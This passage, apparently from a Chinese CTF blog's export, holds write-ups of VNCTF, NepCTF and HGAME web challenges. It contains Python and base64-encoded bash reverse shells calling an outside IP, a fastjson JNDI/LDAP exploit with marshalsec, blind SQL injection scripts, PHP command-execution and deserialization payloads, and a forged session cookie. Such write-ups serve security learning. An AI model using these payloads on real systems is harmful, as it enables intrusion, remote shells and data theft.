出题人说是考察了原生反射的机制（感觉这段时间全都是PHP原生类？），可以去搜一下ReflectionFunction类，利用invokArgs操作，实际上就相当于使用了call_usr_func 出题人的payload： 1index.php?a=ReflectionFunction&amp;b=call_user_func&amp;c=invokeArgs&amp;d=array(%27assert%27,%27s%27.%27how_source(\\%27/f\\%27.\\%27lag\\%27)%27) 感觉自己总是不太明白call_user_func能做什么，这里总结一下： 首先书写例子： 12345&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];echo call_user_func($a,$b); 经过测试，call_user_func 常用的函数如下： 1.file_get_contents这个倒是很好理解： 但是同时要注意的有如下细节： 1.该函数允许使用伪协议 2.该函数允许file://协议等等，所以你可以这样操作： 肯定也支持http协议的啦 但是要注意，file_get_contents该函数并不会自带回显，所以该函数只能用于使用有输出的情况 2.assert 7.0版本才可以使用可以直接命令执行，感觉没啥好说的 3.system可以直接执行命令了，但是感觉大部分情况也会被ban掉，但是awd说不定用得上呢 4.exec和system是一样的，但是需要手动的输出出来 5.shell_exec和exec同理，但是两者之间又有区别。首先两者都需要echo 的输出，但是shell_exec的起点就是当前目录，而exec的起点为之前的目录，故两者间还是有区别的 6.passthru可以用于读取图片？ 不需要echo自己就有回显了 7.pcntl_exec不是很好用，这个需要执行参数执行命令，例子： 1234567&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;#/tmp/b4dboy.sh#!/bin/bashls -l / 但是该函数在7.0已经默认被ban掉了所以并不好用 其他函数命令执行函数： 12345ob_start()、unserialize()、creat_function()usort()、uasort()、uksort()array_filter()array_reduce()array_map()","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"FastJson","slug":"FastJson","permalink":"http://example.com/tags/FastJson/"}]},{"title":"vnctf","slug":"vnctf","date":"2021-03-23T10:14:40.000Z","updated":"2021-03-23T12:15:12.177Z","comments":true,"path":"2021/03/23/vnctf/","link":"","permalink":"http://example.com/2021/03/23/vnctf/","excerpt":"","text":"VNCTF 的刷题记录 HappyCTFd一个CVE的复原CVE-2020-7245，没有什么好说的 CHECKIN这个题目算比较简单嘞， 题目给出源码： 12345678910111213141516171819202122232425262728from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#x27;/flag&#x27;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#x27;/shell&#x27;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#x27;c&#x27;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#x27;/&#x27;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;) 可以看见shell的part去执行命令了。直接反弹shell 1shell?c=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;81.69.201.65&#x27;,8002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot; 这里有一个trick，就是当Python处理文件的时候，若仅仅是open却没有close流的话，还是可以通过proc下读取的，所以我们再次执行命令 1cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;* 即可。 TimeTravel学到了..深感自己对于HTTP和NC的了解不足 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);require __DIR__ . &#x27;/vendor/autoload.php&#x27;;use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET[&#x27;flag&#x27;])) &#123; $client = new Client(); $response = $client-&gt;get(&#x27;http://127.0.0.1:5000/api/eligible&#x27;); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data[&#x27;success&#x27;] === true) &#123; echo system(&#x27;/readflag&#x27;); &#125;&#125;if(isset($_GET[&#x27;file&#x27;])) &#123; highlight_file($_GET[&#x27;file&#x27;]);&#125;if(isset($_GET[&#x27;phpinfo&#x27;])) &#123; phpinfo();&#125; 一开始看见有个任意文件读取我就在那猛读，结果啥也没有，后来才知道是GuzzleHttp的漏洞，文章出处： 1https:&#x2F;&#x2F;www.laruence.com&#x2F;2016&#x2F;07&#x2F;19&#x2F;3101.html 在文章当中我们就可以看见作者说到： 所以， 这个漏洞要影响你， 有几个核心前提是: 你的服务会对外请求资源 你的服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库） 你的服务跑在PHP的CGI模式下(cgi, php-fpm) 那么先看phpinfo，确实运行才CGI模式下，之后再看环境代理，作者清楚的写出了http_proxy的Guzzle有缺陷，所以我们可以利用文章中作者给出的姿势： 我们利用nc就可以操作到，先监听，之后伪造一个访问的信息即可 12345678HTTP/1.1 200 OKServer: nginx/1.14.2Date: Sat, 29 Feb 2020 05:27:31 GMTContent-Type: text/html; charset=UTF-8Connection: Keep-aliveContent-Length: 16&#123;&quot;success&quot;:&quot;true&quot;&#125;","categories":[],"tags":[]},{"title":"VNCTF_2021_realezjvav","slug":"VNCTF-2021-realezjvav","date":"2021-03-22T12:58:52.000Z","updated":"2021-03-25T06:48:40.737Z","comments":true,"path":"2021/03/22/VNCTF-2021-realezjvav/","link":"","permalink":"http://example.com/2021/03/22/VNCTF-2021-realezjvav/","excerpt":"","text":"sql注入这里不是我想学习的重点，故直接甩一个笛卡尔积的脚本 123456789101112131415161718192021222324252627import requestsfrom time import *url=&quot;http://73b041f1-d05e-451c-8ef9-eeda4da6ab8e.node3.buuoj.cn/user/login&quot;flag=&quot;&quot;for i in range(1,100): min=32 max=128 while 1: j=min+(max-min)//2 if j==min: flag+=chr(j) print(flag) break payload=&quot;-1&#x27;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;.format(i,j) data=&#123; &#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:payload &#125; try: r=requests.post(url=url,data=data,timeout=0.7) min=j except: max=j sleep(0.4) 或者这个： 123456789101112131415161718192021222324252627282930313233343536import requestsurl=&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 # p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) # p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) data1=&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;password&#x27;:p1&#125; data2=&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;password&#x27;:p2&#125; try: print(i,mid) r1=requests.post(url,data=data1,timeout=1) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data2,timeout=1) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break 得到密码，得到上去之后可以创建用户： 发现源码： 123456789101112131415161718192021//提交json数据function send() &#123; var jsonStr = &#123; &quot;name&quot; : $(&#x27;#se1&#x27;).val() &#125;; $.ajax(&#123; //几个参数需要注意一下 type: &quot;POST&quot;,//方法类型 dataType:&quot;text&quot;, contentType: &quot;application/x-www-form-urlencoded;charset=utf-8&quot;,//预期服务器返回的数据类型 url: &quot;/create&quot; ,//url data:&#123;&quot;roleJson&quot;:JSON.stringify(jsonStr)&#125;, success: function (result) &#123; resObj = eval(&quot;(&quot;+result+&quot;)&quot;); $(&quot;#roleText&quot;).html(&quot;&lt;span&gt;&quot;+resObj.hello+&quot;&lt;/span&gt;&quot;); $(&quot;#roleImg&quot;).html(&#x27;&lt;img style=&quot;width:180px;height:180px&quot; src=&quot;/searchimage?img=&#x27;+resObj.number +&#x27;.png&quot;/&gt;&#x27;) &#125;, error : function() &#123; console.log(&quot;运行异常&quot;); &#125; &#125;);&#125; 尝试读取文件： java的题目，多半是fastjson出问题了，看下版本 fastjson起服务这里写给自己用于记录，兴许别人第一次也会用得到，首先在新建一个Exploit.java ,代码如下： 12345678910111213141516public class Exploit &#123; public Exploit() &#123; try &#123; Runtime.getRuntime().exec( &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjY5LjIwMS42NS84MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv) &#123; Exploit e = new Exploit(); &#125;&#125; 执行命令： 1javac Exploit.java 得到文件Exploit.class,在当前文件下输入指令， 1python -m http.server 8002 成功之后应该像这样： 再之后下载marshalsec-master，安装完成之后去target目录下执行命令： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://81.69.201.65:8002/#Exploit 再之后打payload就好： 12&#123;&quot;name&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://81.69.201.65:1389/Exploit&quot;,&quot;\\u0061\\u0075\\u0074\\u006f\\u0043\\u006f\\u006d\\u006d\\u0069\\u0074&quot;:true&#125;&#125;&#125;","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"Easy_Tomcat","slug":"Easy-Tomcat","date":"2021-03-22T03:18:00.000Z","updated":"2021-03-22T12:58:20.943Z","comments":true,"path":"2021/03/22/Easy-Tomcat/","link":"","permalink":"http://example.com/2021/03/22/Easy-Tomcat/","excerpt":"","text":"没做过java题目","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"},{"name":"FastJson","slug":"FastJson","permalink":"http://example.com/tags/FastJson/"}]},{"title":"nepctf_梦里花开牡丹亭","slug":"nepctf-梦里花开牡丹亭","date":"2021-03-22T02:41:19.000Z","updated":"2021-03-22T03:11:17.071Z","comments":true,"path":"2021/03/22/nepctf-梦里花开牡丹亭/","link":"","permalink":"http://example.com/2021/03/22/nepctf-%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD/","excerpt":"","text":"一道考点比较有趣的题目，虽然不难而且有点绕，但是感觉思路还是很精妙的！ 首先打开题目可以看到源码： 读取shell.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125;class register&#123; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; die(&#x27;success register admin&#x27;); &#125;else&#123; die(&#x27;please register admin &#x27;); &#125; &#125;&#125;class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123; @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125; 我们的最终目的是读取文件，所以需要利用到题目中给到的Open类中的open函数，查看哪里使用open函数，该题思路比较简单，就是 open-&gt;login-&gt;game 这三个类 首先第一步的绕过直接用数组绕过即可，这个简单，重点是反序列化我们，查POP链，一开始我以为是绕过wakeup函数，后来发现没法绕了（7.0+版本已消除了该问题），浪费了蛮多时间的，但是也没啥关系，我们直接走wakeup出发 12345678public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;// echo $this-&gt;content; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; 看到这里会先看我们的regiter的md5值,md5翻译出来就是admin，成功的话就会调用login，失败了就会去register，但是register没啥用，所以我们要保证能进入login当中，故第一步的payload： 12$a=new Game();$a-&gt;register=&#x27;admin&#x27; 接下来看login函数： 12345678910111213141516171819class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125; 发现login函数的checking函数会对用户名和密码进行检查，检查过后就会调用this-&gt;file的open函数，故我们需要构建： 1234$a-&gt;username=&#x27;admin&#x27;;$a-&gt;password=&#x27;admin&#x27;;$c = new Open();$a-&gt;file = $c; 再看Open函数做了什么 123456789class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125; 发现当没有waf.txt的时候便会执行shell函数：但是当前我们不知道shell.php的用法，如果有waf.txt则会读取文件，目前我们是有waf.txt的，所以可以读取文件，那么接着构造payload: 1$a-&gt;filename = &#x27;shell&#x27; 这样就可以读取到文件shell.php 123456789101112&lt;?phpfunction shell($cmd)&#123; if(strlen($cmd)&lt;10)&#123; if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123; die(&quot;NO&quot;); &#125;else&#123; return system($cmd); &#125; &#125;else&#123; die(&#x27;so long!&#x27;); &#125;&#125; 到这就傻眼了，虽然这个绕过不难，但是我该怎么调用shell函数呢？这时再回头看，发现open函数如果没有找到waf.txt的话就会调用。。这就傻眼了，这怎么可能可以？ 删除waf.txt这时候就要重新回顾题目了，题目调用到了open函数，但是我们可以猜想open函数难道只能用当前题目的Open类吗？是不是有其他内置类也有同名函数呢。所以上php官网去查找了一番，果然最终找到 那么这样就可以解决了，构造payload： 123$a-&gt;file=new ZipArchive;$a-&gt;filename=&#x27;waf.txt&#x27;;$a-&gt;content = ZipArchive::OVERWRITE 这样就可以删除掉文件 绕过过滤这个就是最简单的一部了，直接php /flag 即可，最终payload： 123456789101112131415161718$a&#x3D;new Game();$a-&gt;username&#x3D;&#39;admin&#39;;$a-&gt;password&#x3D;&#39;admin&#39;;$c&#x3D;new Open();$a-&gt;file&#x3D;$c;&#x2F;&#x2F;$c&#x3D;new Open();&#x2F;&#x2F;$a-&gt;file&#x3D;new ZipArchive;&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;&#x2F;&#x2F;$a-&gt;content&#x3D;ZipArchive::OVERWRITE;&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;$a-&gt;filename&#x3D;&quot;waf.txt&quot;;$s&#x3D; (serialize($a));echo base64_encode($s);unserialize($s); 总结： 感觉这题目的思路挺好的，利用到了内置类的知识，相当有趣~（虽然做的时候呗绕来绕去","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"nodejs学习笔记","slug":"nodejs学习笔记","date":"2021-03-01T06:43:16.000Z","updated":"2021-03-01T07:04:30.595Z","comments":true,"path":"2021/03/01/nodejs学习笔记/","link":"","permalink":"http://example.com/2021/03/01/nodejs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"nodejs现在nodejs来进行rce的题目越来越多了，，必须得学习一波了，这里开始学习 require和export在nodejs当中，export用于建立文件的对外接口，你可以理解为在nodejs当中的单个文件都是封闭状态，如果不用export来定义对外的接口，其他文件是无法进行import操作的 require 与 import的区别即是require运行用户动态的来获取需要的包 文件操作Node.js 对传统的 js 最大的升级就是支持了文件操作和网络编程。内置的 fs 模块对文件读写提供了强大的支持，不仅支持传统的同步文件读写，还支持颇具 js 特色的异步文件读写。","categories":[],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"原型链污染","slug":"原型链污染","permalink":"http://example.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"hgame","slug":"hgame","date":"2021-02-24T03:19:28.000Z","updated":"2021-03-01T04:19:58.638Z","comments":true,"path":"2021/02/24/hgame/","link":"","permalink":"http://example.com/2021/02/24/hgame/","excerpt":"","text":"Hgame 题目出得都挺好的.. week1Hitchhiking_in_the_Galaxy各种抓包就好了 简单且上头的游戏JS里面可以找到，但是也可以通过改分辨率真的玩游戏 宝藏走私者HTTP走私，已经写过了 智商检测鸡一个脚本题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import requestsfrom sympy import *import reimport jsonimport timefrom bs4 import BeautifulSoupfrom requests.cookies import RequestsCookieJar# import json# 得到问题def getQuestion(content): soup=BeautifulSoup(content,&#x27;html.parser&#x27;) #print soup.prettify() a=soup.find_all(&#x27;mo&#x27;) b=soup.find_all(&#x27;mi&#x27;) c=soup.find_all(&#x27;mn&#x27;) sx=a[1].string+c[0].string xx=c[1].string sc=c[2].string+&quot;*&quot;+b[0].string+a[3].string+c[3].string print(&quot;sc=&#123;&#125;,sx=&#123;&#125;,xx=&#123;&#125;&quot;.format(sc,sx,xx)) # print(sx+&quot;:&quot;+xx+&quot;:&quot;+sc) x=symbols(&#x27;x&#x27;) answer=float(integrate(sc,(&#x27;x&#x27;,sx,xx))) # print(answer) return answer# print(res)# &#123;&quot;answer&quot;:-42927&#125;# &#123;&quot;answer&quot;:&quot;-42927&quot;&#125;# 回答问题def verify(answer,cookies): verify = &quot;http://r4u.top:5000/api/verify&quot; headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;,&#x27;Cookie&#x27;:&#x27;session=&#123;&#125;&#x27;.format(cookies)&#125; data = &#123;&quot;answer&quot;: &quot;&#123;&#125;&quot;.format(answer)&#125; res2 = requests.post(verify, data=json.dumps(data),headers=headers) cookies = res2.cookies[&#x27;session&#x27;] return cookies# print(integrate(18 * x + 18, (&#x27;x&#x27;, -68, 83)))# 先进行顶一次访问拿到cookiescookies = verify(1,&quot;sss&quot;)for i in range(1,101): # print(answer) Question = &quot;http://r4u.top:5000/api/getQuestion&quot; print(cookies) header = &#123;&#x27;Cookie&#x27;:&#x27;session=&#123;&#125;&#x27;.format(cookies)&#125; res = requests.get(Question,headers=header) content = res.text # 得到答案 answer = getQuestion(content) verify = &quot;http://r4u.top:5000/api/verify&quot; headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;,&#x27;Cookie&#x27;:&#x27;session=&#123;&#125;&#x27;.format(cookies)&#125; data = &#123;&quot;answer&quot;: &quot;&#123;&#125;&quot;.format(answer)&#125; res2 = requests.post(verify, data=json.dumps(data),headers=headers) print(res2.text) cookies = res2.cookies[&#x27;session&#x27;] print(cookies) print(answer) week2懒狗R4u可以拿下源码www.zip 123456789101112$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];// 直接注册所有变量，这样我就能少打字力，芜湖~foreach(array(&#x27;_GET&#x27;,&#x27;_POST&#x27;) as $_request)&#123; foreach ($$_request as $_k =&gt; $_v)&#123; foreach ($filter as $youBadBad)&#123; $_k = str_replace($youBadBad, &#x27;&#x27;, $_k); &#125; $&#123;$_k&#125; = $_v; &#125;&#125; 很经典的变量覆盖了，过滤只不过是变空，这样子构造Payload ?_SSSSESIONESION[username]=admin 即可 200OK！一道简单的注入题目，做的时候想复杂了，后来才意识到那么简单 12345678910111213141516171819202122232425262728293031323334import requests,sysurl = &quot;https://200ok.liki.link/server.php&quot;# headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/database() #&quot;&#125;headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/group_concat(table_name)/**/From(information_schema.tables)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;&#125;headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/group_concat(column_name)/**/From(information_schema.columns)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;&#125;headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/ffffff14gggggg/**/From/**/f1111111144444444444g #&quot;&#125;res = requests.get(url, headers=headers).textprint(res)# flag = &quot;&quot;# for i in range(1, 999):# # for j in stringlist:# for j in range(40, 126):# # sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)# # sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)# # sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(# # i, j)# sql = &quot;1&#x27;||if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0) #&quot;.format(i,j)# sql = &quot;1&#x27;||if(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) #&quot;.format(i,j)# headers = &#123;&quot;Status&quot;: sql&#125;# res = requests.get(url=url, headers=headers)# # print(data)# if &quot;NETWORK ERROR&quot; in res.text:# print(j)# flag += chr(j)# print(flag)# break# if i == 30:# sys.exit()# database: week2sql week3Arknights在git泄露 可以下载出源码， 很简单的就可以找到： 12345678910class Eeeeeeevallllllll&#123; public $msg=&quot;坏坏liki到此一游&quot;; public function __destruct() &#123; echo $this-&gt;msg; &#125;&#125; 接下来就去找toString，也很简单： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class CardsPool&#123; public $cards; private $file = &#x27;1.txt&#x27;; public function __construct($file) &#123; $this-&gt;file=$file; &#125; public function draw() &#123; $rand = mt_rand(1, 100); $level = 0; if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) &#123; $level = 3; &#125; elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) &#123; $level = 4; &#125; elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) &#123; $level = 5; &#125; elseif ($rand == 100) &#123; $level = 6; &#125; $rand_key = array_rand($this-&gt;cards[$level]); return array( &quot;stars&quot; =&gt; $level, &quot;No&quot; =&gt; $rand_key, &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key] ); &#125; public function init() &#123; $this-&gt;cards = include($this-&gt;file); &#125; public function __toString()&#123; return file_get_contents($this-&gt;file); &#125;&#125; 然后就找个能触发反序列化的地方： 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Session&#123; private $sessionData; const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;; public function __construct()&#123;&#125; public function set($key, $value)&#123; if(empty($key))&#123; $this-&gt;sessionData[] = $value; &#125;else&#123; $this-&gt;sessionData[$key] = $value; &#125; &#125; public function getAll()&#123; return $this-&gt;sessionData; &#125; public function save()&#123; $serialized = serialize($this-&gt;sessionData); $sign = base64_encode(md5($serialized . self::SECRET_KEY)); $value = base64_encode($serialized) . &quot;.&quot; . $sign; setcookie(&quot;session&quot;,$value); &#125; public function extract($session)&#123; $sess_array = explode(&quot;.&quot;, $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::SECRET_KEY))&#123; $this-&gt;sessionData = unserialize($data); &#125;else&#123; unset($this-&gt;sessionData); die(&quot;Go away! You hacker!&quot;); &#125; &#125;&#125; 正好就有，只需要我们的session符合他的规则就可以构造反序列化了，那么构造Payload： 1234567891011$Eval = new Eeeeeeevallllllll();$card = new CardsPool(&#x27;./flag.php&#x27;);const SECRET_KEY= &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;$Eval-&gt;msg=$card;$serialized = serialize($Eval);$sign = base64_encode(md5($serialized . SECRET_KEY));$value = base64_encode($serialized) . &quot;.&quot; . $sign;echo $value; 这样得到答案 1TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6MTA6Ii4vZmxhZy5waHAiO319.ZjgzNzJjMDVlNTI3MGRlZTRiYjg4NDQxNWNhZGZiNDA= ForgetfulSSTI的题目，几乎没有过滤，直接拿下，参考我以前的文章payload可以直接打通 week4漫无止境的星期日JS原型链污染+ejs的模板注入 在static/www.zip 下面可以拿到源码： 重点代码在这里： 12345678910111213app.all(&#x27;/wish&#x27;, (req, res) =&gt; &#123; if (!req.session.crying) &#123; return res.send(&quot;forbidden.&quot;) &#125; if (req.method == &#x27;POST&#x27;) &#123; let wishes = req.body.wishes req.session.wishes = ejs.render(`&lt;div class=&quot;wishes&quot;&gt;$&#123;wishes&#125;&lt;/div&gt;`) return res.redirect(302, &#x27;/show&#x27;); &#125; return res.render(&#x27;wish&#x27;);&#125;) 这里可以通过模板注入，但是必须完成前置条件，得到session.crying，所以往前找 代码如下： 1234567891011121314151617181920app.all(&#x27;/&#x27;, (req, res) =&gt; &#123; let data = &#123; name: &quot;&quot;, discription: &quot;&quot; &#125; if (req.ip === &quot;::ffff:127.0.0.1&quot;) &#123; data.crying = true &#125; if (req.method == &#x27;POST&#x27;) &#123; Object.keys(req.body).forEach((key) =&gt; &#123; if (key !== &quot;crying&quot;) &#123; data[key] = req.body[key] &#125; &#125;) req.session.crying = data.crying req.session.name = data.name req.session.discription = data.discription return res.redirect(302, &#x27;/show&#x27;); &#125; return res.render(&#x27;loop&#x27;)&#125;) 